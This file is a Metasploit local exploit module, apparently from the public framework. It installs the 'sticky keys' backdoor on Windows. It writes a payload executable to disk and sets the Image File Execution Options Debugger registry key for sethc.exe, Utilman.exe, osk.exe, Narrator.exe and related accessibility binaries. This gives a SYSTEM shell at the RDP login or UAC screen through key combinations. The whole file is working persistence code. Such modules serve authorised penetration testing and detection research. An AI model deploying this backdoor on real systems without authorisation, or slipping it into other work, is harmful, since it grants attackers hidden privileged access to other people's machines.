##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::Local::Persistence
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv
  include Msf::Exploit::Deprecated
  moved_from 'post/windows/manage/sticky_keys'

  DEBUG_REG_PATH = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options'
  DEBUG_REG_VALUE = 'Debugger'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Accessibility Features (Sticky Keys) Persistence via Debugger Registry Key',
        'Description' => %q{
          This module makes it possible to apply the 'sticky keys' hack to a session with appropriate
          rights. The hack provides a means to get a SYSTEM shell using UI-level interaction at an RDP
          login screen or via a UAC confirmation dialog. The module modifies the Debug registry setting
          for certain executables.

          The module options allow for this hack to be applied to:

          SETHC   (sethc.exe is invoked when SHIFT is pressed 5 times),
          UTILMAN (Utilman.exe is invoked by pressing WINDOWS+U),
          OSK     (osk.exe is invoked by pressing WINDOWS+U, then launching the on-screen keyboard),
          DISP    (DisplaySwitch.exe is invoked by pressing WINDOWS+P),
          NARRATOR (Narrator.exe is invoked by pressing WINDOWS+CTR+ENTER),
          ATBROKER (AtBroker.exe is invoked by launching accessibility features from the login screen, such as WINDOWS+CTR+ENTER).

          Custom payloads and binaries can be run as part of this exploit, but must be manually uploaded
          to the target prior to running the module.
        },
        'Author' => [
          'OJ Reeves', # original module
          'h00die' # persistence mixin, narrator, atbroker, docs
        ],
        'Platform' => ['win'],
        'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64],
        'SessionTypes' => ['meterpreter', 'shell'],
        'References' => [
          ['URL', 'https://web.archive.org/web/20170201184448/https://social.technet.microsoft.com/Forums/windows/en-US/a3968ec9-5824-4bc2-82a2-a37ea88c273a/sticky-keys-exploit'],
          ['URL', 'https://blog.carnal0wnage.com/2012/04/privilege-escalation-via-sticky-keys.html'],
          ['URL', 'https://support.microsoft.com/en-us/windows/appendix-b-narrator-keyboard-commands-and-touch-gestures-8bdab3f4-b3e9-4554-7f28-8b15bd37410a'],
          ['ATT&CK', Mitre::Attack::Technique::T1183_IMAGE_FILE_EXECUTION_OPTIONS_INJECTION],
          ['ATT&CK', Mitre::Attack::Technique::T1546_008_ACCESSIBILITY_FEATURES],
          ['ATT&CK', Mitre::Attack::Technique::T1546_EVENT_TRIGGERED_EXECUTION],
          ['URL', 'https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/']
        ],
        'Targets' => [
          [ 'Automatic', {} ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '1995-04-24', # windows 95 release date which included first sticky keys
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION, EVENT_DEPENDENT],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptString.new('PAYLOAD_NAME', [false, 'Name of payload file to write. Random string as default.']),
      OptEnum.new('BINARY', [true, 'The target binary to add the exploit to.', 'SETHC', ['SETHC', 'UTILMAN', 'OSK', 'DISP', 'NARRATOR', 'ATBROKER']]),
    ])
  end

  #
  # Returns the name of the executable to modify the debugger settings of.
  #
  def get_target_exe_name
    case datastore['BINARY']
    when 'UTILMAN'
      'Utilman.exe'
    when 'OSK'
      'osk.exe'
    when 'DISP'
      'DisplaySwitch.exe'
    when 'NARRATOR'
      'Narrator.exe'
    when 'ATBROKER'
      'AtBroker.exe'
    else
      'sethc.exe'
    end
  end

  #
  # Returns the key combinations required to invoke the exploit once installed.
  #
  def get_target_key_combo
    case datastore['BINARY']
    when 'UTILMAN'
      'WINDOWS+U'
    when 'OSK'
      'WINDOWS+U, then launching the on-screen keyboard'
    when 'DISP'
      'WINDOWS+P'
    when 'NARRATOR'
      'WINDOWS+CTR+ENTER'
    when 'ATBROKER'
      'Launching accessibility features from the login screen (such as WINDOWS+CTR+ENTER)'
    else
      'SHIFT 5 times'
    end
  end

  #
  # Returns the full path to the target's registry key based on the current target
  # settings.
  #
  def get_target_exe_reg_key
    "#{DEBUG_REG_PATH}\\#{get_target_exe_name}"
  end

  def writable_dir
    d = super
    return session.sys.config.getenv(d) if d.start_with?('%')

    d
  end

  def check
    print_warning('Payloads in %TEMP% will only last until reboot, you want to choose elsewhere.') if datastore['WritableDir'].start_with?('%TEMP%') # check the original value
    return CheckCode::Safe("#{writable_dir} doesnt exist") unless exists?(writable_dir)

    return CheckCode::Safe('You have admin rights to run this Module') unless is_admin?

    CheckCode::Appears('Likely exploitable')
  end

  def install_persistence
    payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha((rand(6..13)))
    temp_path = writable_dir
    payload_exe = generate_payload_exe
    payload_pathname = temp_path + '\\' + payload_name + '.exe'
    vprint_status("Payload pathname: #{payload_pathname}")
    fail_with(Failure::UnexpectedReply, "Error writing payload to: #{payload_pathname}") unless write_file(payload_pathname, payload_exe)
    target_key = get_target_exe_reg_key
    registry_createkey(target_key)
    registry_setvaldata(target_key, DEBUG_REG_VALUE, payload_pathname, 'REG_SZ')

    print_good("'Sticky keys' successfully added. Launch the exploit at an RDP or UAC prompt by pressing #{get_target_key_combo}.")
    @clean_up_rc << "rm \"#{payload_pathname.gsub('\\', '\\\\\\\\')}\"\n"
    @clean_up_rc << "execute -f cmd.exe -a \"/c reg delete \"#{target_key}\" /v GlobalFlag /f\" -H\n"
  end
end
